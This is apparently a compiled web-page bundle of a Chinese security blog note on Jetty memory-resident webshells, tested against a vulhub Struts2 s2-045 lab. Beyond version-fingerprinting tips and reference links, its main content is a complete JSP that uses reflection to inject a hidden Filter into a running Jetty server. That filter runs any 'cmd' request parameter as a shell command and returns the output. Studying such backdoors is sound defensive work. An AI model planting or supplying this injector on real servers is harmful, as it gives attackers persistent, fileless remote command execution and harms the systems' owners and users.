import{_ as s}from"./plugin-vue_export-helper-DlAUqK2U.js";import{r,o as a,c as d,a as e,d as l,b as n,e as i}from"./app-CEAMCwoj.js";const o={},u=i('<h1 id="jetty内存马" tabindex="-1"><a class="header-anchor" href="#jetty内存马"><span>Jetty内存马</span></a></h1><p>Eclipse Jetty 是一个轻量级、高度可扩展、基于 Java 的 Web 服务器和 Servlet 引擎。Jetty 的目标是以高容量、低延迟的方式支持 Web 协议（HTTP/1、HTTP/2、HTTP/3、WebSocket 等），从而提供最高性能，同时保持易用性和与多年 Servlet 开发的兼容性。</p><p>Jetty 是一种现代的完全异步 Web 服务器，作为面向组件的技术有着悠久的历史，可以轻松嵌入到应用程序中，同时仍然为 Web 应用程序部署提供可靠的传统发行版。</p><hr><h2 id="基本信息收集" tabindex="-1"><a class="header-anchor" href="#基本信息收集"><span>基本信息收集</span></a></h2><h3 id="查看版本号" tabindex="-1"><a class="header-anchor" href="#查看版本号"><span>查看版本号</span></a></h3><ul><li><p>Web侧的话</p><ul><li><p>响应标头中可能会有 Jetty 版本信息, 例如:</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202409181629820.png" alt="image-20240918162938756"></p></li><li><p>Wappalyzer 应该也是用的上面这种方案获取的版本信息:</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202409181630064.png" alt="image-20240918163003019"></p></li></ul></li><li><p>主机侧的话</p><ul><li><p>可以在 JavaWeb 项目的 <code>pom.xml</code> 中看到 jetty 的版本号</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202409181623686.png" alt="image-20240918162309589"></p></li><li><p>直接 <code>find / | grep jetty</code> 也可能看到相应路径信息中显示的 jetty 版本信息:</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202409181624482.png" alt="image-20240918162417425"></p></li></ul></li></ul><hr><h2 id="构造可用的-servlet" tabindex="-1"><a class="header-anchor" href="#构造可用的-servlet"><span>构造可用的 Servlet</span></a></h2><p>Jetty 9.2.x 提供了更加安全且可维护的方式来处理 <code>Servlet</code> 的动态注册</p><p>可以通过 <code>ServletHandler</code> 和 <code>ServletHolder</code> 来动态注册 <code>Servlet</code>，并设置 URL 映射。这不再需要反射访问私有字段</p><blockquote><p>TODO: 搞不出来, 看了下 <code>web.xml</code> 里也没有配置 servlet mapping 之类的, 遂放弃</p></blockquote><hr><h2 id="构造内存马" tabindex="-1"><a class="header-anchor" href="#构造内存马"><span>构造内存马</span></a></h2>',14),c={href:"https://xz.aliyun.com/t/12182?time__1311=GqGxRDniiQQ0526Dy7D97rTnikxuYoD#toc-3",target:"_blank",rel:"noopener noreferrer"},v={href:"https://github.com/feihong-cs/memShell/blob/master/src/main/java/com/memshell/jetty/FilterBasedWithoutRequest.java",target:"_blank",rel:"noopener noreferrer"},m={href:"https://3gstudent.github.io/",target:"_blank",rel:"noopener noreferrer"},p={href:"https://3gstudent.github.io/Java%E5%88%A9%E7%94%A8%E6%8A%80%E5%B7%A7-Jetty-Servlet%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC",target:"_blank",rel:"noopener noreferrer"},b=e("hr",null,null,-1),h=e("h2",{id:"filter内存马",tabindex:"-1"},[e("a",{class:"header-anchor",href:"#filter内存马"},[e("span",null,"Filter内存马")])],-1),g={href:"https://xz.aliyun.com/t/15141?u_atoken=1f048c5fb527d82d5ec4ba4c07b4c57d&u_asig=0a472f8c17266484778997576e004d",target:"_blank",rel:"noopener noreferrer"},q={href:"https://github.com/feihong-cs/memShell/blob/master/src/main/java/com/memshell/jetty/FilterBasedWithoutRequest.java",target:"_blank",rel:"noopener noreferrer"},f={href:"https://3gstudent.github.io/Java%E5%88%A9%E7%94%A8%E6%8A%80%E5%B7%A7-Jetty-Filter%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC",target:"_blank",rel:"noopener noreferrer"},y={href:"https://xz.aliyun.com/t/12182?time__1311=GqGxRDniiQQ0526Dy7D97rTnikxuYoD#toc-3",target:"_blank",rel:"noopener noreferrer"},C=i(`<p>环境: vulhub 的 s2-045 Docker, 其中 Jetty 版本为 9.2.11</p><hr><div class="language-jsp line-numbers-mode" data-ext="jsp" data-title="jsp"><pre class="language-jsp"><code>&lt;%@ page import=&quot;java.lang.reflect.Field&quot;%&gt;
&lt;%@ page import=&quot;java.lang.reflect.Method&quot;%&gt;
&lt;%@ page import=&quot;java.util.Scanner&quot;%&gt;
&lt;%@ page import=&quot;java.util.EnumSet&quot;%&gt;
&lt;%@ page import=&quot;java.io.*&quot;%&gt;

&lt;%
    String filterName = &quot;myFilter&quot;;
    String urlPattern = &quot;/filter&quot;;
    Filter filter = new Filter() {
        @Override
        public void init(FilterConfig filterConfig) throws ServletException {
        }
        @Override
        public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
            HttpServletRequest req = (HttpServletRequest) servletRequest;
            if (req.getParameter(&quot;cmd&quot;) != null) {
                boolean isLinux = true;
                String osTyp = System.getProperty(&quot;os.name&quot;);
                if (osTyp != null &amp;&amp; osTyp.toLowerCase().contains(&quot;win&quot;)) {
                    isLinux = false;
                }
                String[] cmds = isLinux ? new String[] {&quot;sh&quot;, &quot;-c&quot;, req.getParameter(&quot;cmd&quot;)} : new String[] {&quot;cmd.exe&quot;, &quot;/c&quot;, req.getParameter(&quot;cmd&quot;)};
                InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
                Scanner s = new Scanner( in ).useDelimiter(&quot;\\\\a&quot;);
                String output = s.hasNext() ? s.next() : &quot;&quot;;
                servletResponse.getWriter().write(output);
                servletResponse.getWriter().flush();
                return;
            }
            filterChain.doFilter(servletRequest, servletResponse);
        }
        @Override
        public void destroy() {
        }
    };

    Method threadMethod = Class.forName(&quot;java.lang.Thread&quot;).getDeclaredMethod(&quot;getThreads&quot;);
    threadMethod.setAccessible(true);
    Thread[] threads = (Thread[]) threadMethod.invoke(null);
    ClassLoader threadClassLoader = null;

    for (Thread thread:threads)
    {
        threadClassLoader = thread.getContextClassLoader();
        if(threadClassLoader != null){
            if(threadClassLoader.toString().contains(&quot;WebAppClassLoader&quot;)){
                Field fieldContext = threadClassLoader.getClass().getDeclaredField(&quot;_context&quot;);
                fieldContext.setAccessible(true);
                Object webAppContext = fieldContext.get(threadClassLoader);
                
                // 打印调试信息
                out.println(&quot;webAppContext class: &quot; + webAppContext.getClass().getName() + &quot;&lt;br&gt;&quot;);
                out.println(&quot;webAppContext superclass: &quot; + webAppContext.getClass().getSuperclass().getName() + &quot;&lt;br&gt;&quot;);
                
                try {
                    // 获取 _servletHandler 字段
                    Field fieldServletHandler = webAppContext.getClass().getSuperclass().getSuperclass().getDeclaredField(&quot;_servletHandler&quot;);
                    fieldServletHandler.setAccessible(true);
                    Object servletHandler = fieldServletHandler.get(webAppContext);
                    Field fieldFilters = servletHandler.getClass().getDeclaredField(&quot;_filters&quot;);
                    fieldFilters.setAccessible(true);
                    Object[] filters = (Object[]) fieldFilters.get(servletHandler);
                    boolean flag = false;
                    for(Object f:filters){
                        Field fieldName = f.getClass().getSuperclass().getDeclaredField(&quot;_name&quot;);
                        fieldName.setAccessible(true);
                        String name = (String) fieldName.get(f);
                        if(name.equals(filterName)){
                            flag = true;
                            break;
                        }
                    }
                    if(flag){
                        out.println(&quot;[-] Filter &quot; + filterName + &quot; exists.&lt;br&gt;&quot;);
                        return;
                    }
                    out.println(&quot;[+] Add Filter: &quot; + filterName + &quot;&lt;br&gt;&quot;);
                    out.println(&quot;[+] urlPattern: &quot; + urlPattern + &quot;&lt;br&gt;&quot;);
                    ClassLoader classLoader = servletHandler.getClass().getClassLoader();
                    Class sourceClazz = null;
                    Object holder = null;
                    Field field = null;
                    try{
                        sourceClazz = classLoader.loadClass(&quot;org.eclipse.jetty.servlet.Source&quot;);
                        field = sourceClazz.getDeclaredField(&quot;JAVAX_API&quot;);
                        Method method = servletHandler.getClass().getMethod(&quot;newFilterHolder&quot;, sourceClazz);
                        holder = method.invoke(servletHandler, field.get(null));
                    }catch(ClassNotFoundException e){
                        sourceClazz = classLoader.loadClass(&quot;org.eclipse.jetty.servlet.BaseHolder$Source&quot;);
                        Method method = servletHandler.getClass().getMethod(&quot;newFilterHolder&quot;, sourceClazz);
                        holder = method.invoke(servletHandler, Enum.valueOf(sourceClazz, &quot;JAVAX_API&quot;));
                    }
                    holder.getClass().getMethod(&quot;setName&quot;, String.class).invoke(holder, filterName);               
                    holder.getClass().getMethod(&quot;setFilter&quot;, Filter.class).invoke(holder, filter);
                    servletHandler.getClass().getMethod(&quot;addFilter&quot;, holder.getClass()).invoke(servletHandler, holder);

                    Class  clazz         = classLoader.loadClass(&quot;org.eclipse.jetty.servlet.FilterMapping&quot;);
                    Object filterMapping = clazz.newInstance();
                    Method method        = filterMapping.getClass().getDeclaredMethod(&quot;setFilterHolder&quot;, holder.getClass());
                    method.setAccessible(true);
                    method.invoke(filterMapping, holder);
                    filterMapping.getClass().getMethod(&quot;setPathSpecs&quot;, String[].class).invoke(filterMapping, new Object[]{new String[]{urlPattern}});
                    filterMapping.getClass().getMethod(&quot;setDispatcherTypes&quot;, EnumSet.class).invoke(filterMapping, EnumSet.of(DispatcherType.REQUEST));
                    servletHandler.getClass().getMethod(&quot;prependFilterMapping&quot;, filterMapping.getClass()).invoke(servletHandler, filterMapping);
                } catch (NoSuchFieldException e) {
                    out.println(&quot;Error: &quot; + e.getMessage() + &quot;&lt;br&gt;&quot;);
                }
            }     
        }
    }
%&gt;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><img src="http://cdn.ayusummer233.top/DailyNotes/202409201525001.png" alt="image-20240920152529930"></p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202409201459280.png" alt="image-20240920145928096"></p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202409201500230.png" alt="image-20240920150008171"></p><hr><h2 id="servlet型内存马" tabindex="-1"><a class="header-anchor" href="#servlet型内存马"><span>Servlet型内存马</span></a></h2>`,8),_={href:"https://3gstudent.github.io/Java%E5%88%A9%E7%94%A8%E6%8A%80%E5%B7%A7-Jetty-Servlet%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC",target:"_blank",rel:"noopener noreferrer"},S=e("hr",null,null,-1),E=e("h2",{id:"customizer型内存马",tabindex:"-1"},[e("a",{class:"header-anchor",href:"#customizer型内存马"},[e("span",null,"Customizer型内存马")])],-1),x={href:"https://rce.moe/2023/08/19/Jetty-Customize-memory-webshell/",target:"_blank",rel:"noopener noreferrer"};function A(k,j){const t=r("ExternalLinkIcon");return a(),d("div",null,[u,e("blockquote",null,[e("p",null,[e("a",c,[l("Jetty 内存马注入分析 - 先知社区 (aliyun.com)"),n(t)])]),e("p",null,[e("a",v,[l("memShell/src/main/java/com/memshell/jetty/FilterBasedWithoutRequest.java at master · feihong-cs/memShell (github.com)"),n(t)])]),e("p",null,[e("a",m,[l("3gstudent-Blog"),n(t)])]),e("p",null,[e("a",p,[l("Java利用技巧——Jetty Servlet型内存马 (3gstudent.github.io)"),n(t)])])]),b,h,e("blockquote",null,[e("p",null,[e("a",g,[l("从0到1学会Jetty内存马注入 - 先知社区 (aliyun.com)"),n(t)])]),e("p",null,[e("a",q,[l("memShell/src/main/java/com/memshell/jetty/FilterBasedWithoutRequest.java at master · feihong-cs/memShell (github.com)"),n(t)])]),e("p",null,[e("a",f,[l("Java利用技巧——Jetty Filter型内存马 (3gstudent.github.io)"),n(t)])]),e("p",null,[e("a",y,[l("Jetty 内存马注入分析 - 先知社区 (aliyun.com)"),n(t)])])]),C,e("blockquote",null,[e("p",null,[e("a",_,[l("Java利用技巧——Jetty Servlet型内存马 (3gstudent.github.io)"),n(t)])])]),S,E,e("blockquote",null,[e("p",null,[e("a",x,[l("一种在高版本JDK下 的新型嵌入式Jetty Customizer内存马实现 - 白帽酱の博客 (rce.moe)"),n(t)])])])])}const D=s(o,[["render",A],["__file","index.html.vue"]]),z=JSON.parse('{"path":"/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/Web%E5%AE%89%E5%85%A8/%E5%86%85%E5%AD%98%E9%A9%AC/Java%E5%86%85%E5%AD%98%E9%A9%AC/Jetty%E5%86%85%E5%AD%98%E9%A9%AC/","title":"Jetty内存马","lang":"zh-CN","frontmatter":{},"headers":[{"level":2,"title":"基本信息收集","slug":"基本信息收集","link":"#基本信息收集","children":[{"level":3,"title":"查看版本号","slug":"查看版本号","link":"#查看版本号","children":[]}]},{"level":2,"title":"构造可用的 Servlet","slug":"构造可用的-servlet","link":"#构造可用的-servlet","children":[]},{"level":2,"title":"构造内存马","slug":"构造内存马","link":"#构造内存马","children":[]},{"level":2,"title":"Filter内存马","slug":"filter内存马","link":"#filter内存马","children":[]},{"level":2,"title":"Servlet型内存马","slug":"servlet型内存马","link":"#servlet型内存马","children":[]},{"level":2,"title":"Customizer型内存马","slug":"customizer型内存马","link":"#customizer型内存马","children":[]}],"git":{"createdTime":1729648121000,"updatedTime":1729648121000,"contributors":[{"name":"233","email":"ayusummer233@vip.qq.com","commits":1}]},"readingTime":{"minutes":3.18,"words":955},"filePathRelative":"网络安全/Web安全/内存马/Java内存马/Jetty内存马/index.md","localizedDate":"2024年10月23日","excerpt":"\\n<p>Eclipse Jetty 是一个轻量级、高度可扩展、基于 Java 的 Web 服务器和 Servlet 引擎。Jetty 的目标是以高容量、低延迟的方式支持 Web 协议（HTTP/1、HTTP/2、HTTP/3、WebSocket 等），从而提供最高性能，同时保持易用性和与多年 Servlet 开发的兼容性。</p>\\n<p>Jetty 是一种现代的完全异步 Web 服务器，作为面向组件的技术有着悠久的历史，可以轻松嵌入到应用程序中，同时仍然为 Web 应用程序部署提供可靠的传统发行版。</p>\\n<hr>\\n<h2>基本信息收集</h2>\\n<h3>查看版本号</h3>\\n<ul>\\n<li>\\n<p>Web侧的话</p>\\n<ul>\\n<li>\\n<p>响应标头中可能会有 Jetty 版本信息, 例如:</p>\\n<p><img src=\\"http://cdn.ayusummer233.top/DailyNotes/202409181629820.png\\" alt=\\"image-20240918162938756\\"></p>\\n</li>\\n<li>\\n<p>Wappalyzer 应该也是用的上面这种方案获取的版本信息:</p>\\n<p><img src=\\"http://cdn.ayusummer233.top/DailyNotes/202409181630064.png\\" alt=\\"image-20240918163003019\\"></p>\\n</li>\\n</ul>\\n</li>\\n<li>\\n<p>主机侧的话</p>\\n<ul>\\n<li>\\n<p>可以在 JavaWeb 项目的 <code>pom.xml</code> 中看到 jetty 的版本号</p>\\n<p><img src=\\"http://cdn.ayusummer233.top/DailyNotes/202409181623686.png\\" alt=\\"image-20240918162309589\\"></p>\\n</li>\\n<li>\\n<p>直接 <code>find / | grep jetty</code> 也可能看到相应路径信息中显示的 jetty 版本信息:</p>\\n<p><img src=\\"http://cdn.ayusummer233.top/DailyNotes/202409181624482.png\\" alt=\\"image-20240918162417425\\"></p>\\n</li>\\n</ul>\\n</li>\\n</ul>"}');export{D as comp,z as data};
